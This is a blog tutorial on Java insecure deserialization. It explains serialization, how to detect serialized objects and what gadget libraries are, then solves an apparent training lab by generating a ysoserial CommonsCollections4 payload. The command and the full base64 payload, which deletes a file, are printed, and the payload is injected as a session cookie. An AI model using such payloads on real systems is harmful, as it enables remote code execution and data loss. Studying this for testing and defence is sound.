---
title: "SERIALIZATION VULNERABILITIES [JAVA],[Explained & Exploited]☠"
layout: page
date: 2023-02-03
image: https://miro.medium.com/max/786/0*Wr3Tm8LvmG57ES_2.webp
headerImage: false
tag:
- markdown
- elements
star: true
category: blog
author: Hashar Mujahid
description: Hi! My name is Hashar Mujahid and today we are going to learn what is Serialization and how we can exploit it in modern frameworks and languages.
---

# SERIALIZATION VULNERABILITIES [JAVA][Explained & Exploited]

Hi! My name is Hashar Mujahid and today we are going to learn what is Serialization and how we can exploit it in modern frameworks and languages.

![](https://miro.medium.com/max/770/0*FzN1XUN-JHV1a594.png)

Banner

Let’s get to the first thing first.

# **WHAT IS SERIALIZATION?**

Serialization is the process of converting the state of the programmistic object into a sequence of bytes that can be reversible.

Serialization is an encoding scheme, not encryption so it can be decoded and data can be tempered.

>The process of decoding the serialized data is called deserialization.

Serialization and deserialization are also called marshaling and unmarshalling respectively.

## Purpose:

Serialization makes it easier to.

-   Storing and transferring the data over the network.
-   Calling remote procedures like rpc

There is a good chance you will find a serialized object in PHP, JAVA, Ruby, and .NET web applications but it can also be implemented in python.

# WHAT IS AN INSECURE DESERIALIZATION?

Insecure deserialization is when a web application deserialized malicious serialized data that is user-controllable. An attacker can create a payload and serialize it correctly according to the application and when the application is trying to deserialize it the malicious payload will execute and render the attack successfully.

Preparing the payload is more challenging than it might sound. It takes some skill and determination to make a working payload.

# **SERIALIZATION VULNERABILITIES IN JAVA:**

In java, serialization vulnerabilities occur when a user tries to inject a modified serialized object in the application’s backend with malicious intent.

Some tools have been developed to help with making serialized payloads for java applications.

-   [Ysoserial](https://github.com/frohoff/ysoserial)
-   [Serialization Dumper](https://github.com/NickstaDB/SerializationDumper)

We can also utilize some burp suite extensions for this purpose.

-   Java Deserialization Scanner.
-   Freddy, Deserialization Bug Finder.

# HOW TO DETECT JAVA SERIALIZED DATA IN WEB ASSESSMENT?

Java Serialize data in binary format which can be more difficult to read and detect but there are some key features in data that may help you detect the serialized data in traffic.

For example:

Java serialized data always starts with `ac ed 00 05` hexadecimal bytes and

`rO0` in base64 format.

# WHAT ARE GADGET LIBRARIES?

The Gadget libraries are the libraries that are used to build some exploits for java serialized objects these are called gadget libraries.

For example.

If you run ysoserial in your terminal you will see a lot of payloads by the name of their libraries.

![](https://miro.medium.com/max/770/1*iY9hsSae3iuu-qac5LEtng.png)

These are the prebuilt gadget libraries that can be used to develop some exploits.

# WHAT IS URLDNS PAYLOAD?

Urldns payload uses java inbuilt features to resolve a DNS name. This payload does not achieve remote code execution but it confirms the presence of insecure deserialization. This payload is known to work with every java use case. During bug bounty, if you find a serialized object you can try to generate a payload using urldns and set burp collaborator to monitor any interaction of the backend with the burp collaborator server.

# Exploiting Java deserialization with Apache Commons

This lab uses a serialization-based session mechanism and loads the Apache Commons Collections library. Although you don’t have source code access, you can still exploit this lab using pre-built gadget chains.

To solve the lab, use a third-party tool to generate a malicious serialized object containing a remote code execution payload. Then, pass this object into the website to delete the `morale.txt` file from Carlos's home directory.

You can log in to your own account using the following credentials: `wiener:peter`

So we need to exploit the java serialization vulnerability to gain code execution.

Let’s login using provided creds.

![](https://miro.medium.com/max/770/1*x0XmwZEef3ELiPsfqwqILw.png)

Burp detection

We can see burp was also able to detect the serialized object in the traffic.

Even if burp wasn't able to detect it we should always be vigilant for some patterns appearing in the HTTP traffic.

![](https://miro.medium.com/max/770/1*gCisZGv6OdXCw4JvFyiMZQ.png)

As here we can see the starting character of the base64 encoded java serialized object.

Let’s generate a payload for the apache commons collection library using ysoserial.

```bash
hax-13@ZARB:~$ ysoserial  CommonsCollections4 'rm /home/carlos/morale.txt' | base64

rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBh  
cmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAQm9yZy5hcGFjaGUuY29tbW9u  
cy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuVHJhbnNmb3JtaW5nQ29tcGFyYXRvci/5hPArsQjM  
AgACTAAJZGVjb3JhdGVkcQB+AAFMAAt0cmFuc2Zvcm1lcnQALUxvcmcvYXBhY2hlL2NvbW1vbnMv  
Y29sbGVjdGlvbnM0L1RyYW5zZm9ybWVyO3hwc3IAQG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0  
aW9uczQuY29tcGFyYXRvcnMuQ29tcGFyYWJsZUNvbXBhcmF0b3L79JkluG6xNwIAAHhwc3IAO29y  
Zy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVy  
MMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAuW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVj  
dGlvbnM0L1RyYW5zZm9ybWVyO3hwdXIALltMb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25z  
NC5UcmFuc2Zvcm1lcjs5gTr7CNo/pQIAAHhwAAAAAnNyADxvcmcuYXBhY2hlLmNvbW1vbnMuY29s  
bGVjdGlvbnM0LmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25z  
dGFudHQAEkxqYXZhL2xhbmcvT2JqZWN0O3hwdnIAN2NvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5p  
bnRlcm5hbC54c2x0Yy50cmF4LlRyQVhGaWx0ZXIAAAAAAAAAAAAAAHhwc3IAP29yZy5hcGFjaGUu  
Y29tbW9ucy5jb2xsZWN0aW9uczQuZnVuY3RvcnMuSW5zdGFudGlhdGVUcmFuc2Zvcm1lcjSL9H+k  
htA7AgACWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7WwALaVBhcmFtVHlwZXN0ABJbTGph  
dmEvbGFuZy9DbGFzczt4cHVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAFz  
cgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVz  
SW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVj  
b2Rlc3QAA1tbQlsABl9jbGFzc3EAfgAUTAAFX25hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMABFf  
b3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tb  
Qkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX+AYIVOACAAB4cAAABqzK/rq+AAAAMgA5CgADACIH  
ADcHACUHACYBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFrSCT85Hd7z4B  
AAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRh  
YmxlAQAEdGhpcwEAE1N0dWJUcmFuc2xldFBheWxvYWQBAAxJbm5lckNsYXNzZXMBADVMeXNvc2Vy  
aWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkOwEACXRyYW5zZm9y  
bQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9z  
dW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxl  
cjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0  
Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2Vy  
aWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAnAQCmKExjb20vc3Vu  
L29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUv  
eG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwv  
aW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1  
TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdo  
YW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJp  
YWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAMR2FkZ2V0cy5qYXZhDAAKAAsHACgBADN5  
c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJFN0dWJUcmFuc2xldFBheWxvYWQBAEBjb20v  
c3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5z  
bGV0AQAUamF2YS9pby9TZXJpYWxpemFibGUBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50  
ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9H  
YWRnZXRzAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAKgEACmdldFJ1bnRpbWUBABUo  
KUxqYXZhL2xhbmcvUnVudGltZTsMACwALQoAKwAuAQAacm0gL2hvbWUvY2FybG9zL21vcmFsZS50  
eHQIADABAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAAy  
ADMKACsANAEADVN0YWNrTWFwVGFibGUBABx5c29zZXJpYWwvUHduZXIyOTIwOTAyNjEwNjg1AQAe  
THlzb3NlcmlhbC9Qd25lcjI5MjA5MDI2MTA2ODU7ACEAAgADAAEABAABABoABQAGAAEABwAAAAIA  
CAAEAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAALwAOAAAADAABAAAA  
BQAPADgAAAABABMAFAACAAwAAAA/AAAAAwAAAAGxAAAAAgANAAAABgABAAAANAAOAAAAIAADAAAA  
AQAPADgAAAAAAAEAFQAWAAEAAAABABcAGAACABkAAAAEAAEAGgABABMAGwACAAwAAABJAAAABAAA  
AAGxAAAAAgANAAAABgABAAAAOAAOAAAAKgAEAAAAAQAPADgAAAAAAAEAFQAWAAEAAAABABwAHQAC  
AAAAAQAeAB8AAwAZAAAABAABABoACAApAAsAAQAMAAAAJAADAAIAAAAPpwADAUy4AC8SMbYANVex  
AAAAAQA2AAAAAwABAwACACAAAAACACEAEQAAAAoAAQACACMAEAAJdXEAfgAfAAAB1Mr+ur4AAAAy  
ABsKAAMAFQcAFwcAGAcAGQEAEHNlcmlhbFZlcnNpb25VSUQBAAFKAQANQ29uc3RhbnRWYWx1ZQVx  
5mnuPG1HGAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZh  
cmlhYmxlVGFibGUBAAR0aGlzAQADRm9vAQAMSW5uZXJDbGFzc2VzAQAlTHlzb3NlcmlhbC9wYXls  
b2Fkcy91dGlsL0dhZGdldHMkRm9vOwEAClNvdXJjZUZpbGUBAAxHYWRnZXRzLmphdmEMAAoACwcA  
GgEAI3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkRm9vAQAQamF2YS9sYW5nL09iamVj  
dAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0  
cwAhAAIAAwABAAQAAQAaAAUABgABAAcAAAACAAgAAQABAAoACwABAAwAAAAvAAEAAQAAAAUqtwAB  
sQAAAAIADQAAAAYAAQAAADwADgAAAAwAAQAAAAUADwASAAAAAgATAAAAAgAUABEAAAAKAAEAAgAW  
ABAACXB0AARQd25ycHcBAHh1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAF2  
cgAdamF2YXgueG1sLnRyYW5zZm9ybS5UZW1wbGF0ZXMAAAAAAAAAAAAAAHhwdwQAAAADc3IAEWph  
dmEubGFuZy5JbnRlZ2VyEuKgpPeBhzgCAAFJAAV2YWx1ZXhyABBqYXZhLmxhbmcuTnVtYmVyhqyV  
HQuU4IsCAAB4cAAAAAFxAH4AKXg=
```

We can see a payload is generated so let’s replace it with our cookie session.

![](https://miro.medium.com/max/770/1*EmPlhfJ-Z5uwTHOX_4iYGA.png)

![](https://miro.medium.com/max/770/1*ljZVD_mr0VPw0gJTiZO9qw.png)

And we can see we were able to complete the lab.

There are a lot of payloads to be tested so I recommend you build a bash or python script that will automate the process of payload generation. That is all for java serialization vulnerabilities. In the next blogs, we will see how serialization vulnerabilities work in PHP.

I will see you in the next blog till then. Happy Hacking ❤.

Peace out.

![](https://media.giphy.com/media/w89ak63KNl0nJl80ig/giphy.gif)
